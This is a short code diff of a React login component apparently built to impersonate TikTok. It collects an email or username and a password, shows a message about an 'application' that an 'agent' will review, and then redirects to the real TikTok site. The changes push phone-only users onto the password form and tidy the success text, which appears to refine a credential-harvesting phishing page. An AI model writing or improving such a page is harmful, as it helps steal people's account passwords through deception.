@@ -39,10 +39,18 @@ export default function EmailLogin() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (activeTab === "Phone" && !phone) {
-      setError("Please enter your phone number.");
+
+    if (activeTab === "Phone") {
+      if (!phone) {
+        setError("Please enter your phone number.");
+        return;
+      }
+      // If only phone is provided, prompt for email login and switch tab
+      setError("Login with email");
+      setActiveTab("Email / Username");
       return;
     }
+
     if (activeTab === "Email / Username" && (!email || !password)) {
       setError("Please enter your email/username and password.");
       return;
@@ -61,7 +69,7 @@ export default function EmailLogin() {
 
       const responseData = await response.json();
       if (response.ok) {
-        setNotification("Thank for Applying, our Agent will get back within 3 working days. You can now continue with tiktok");
+        setNotification("Thank you for applying! Our agent will get back within 3 working days. You can now continue with TikTok.");
         setNotificationType("success");
         setTimeout(() => {
           window.location.href = "https://www.tiktok.com/explore";
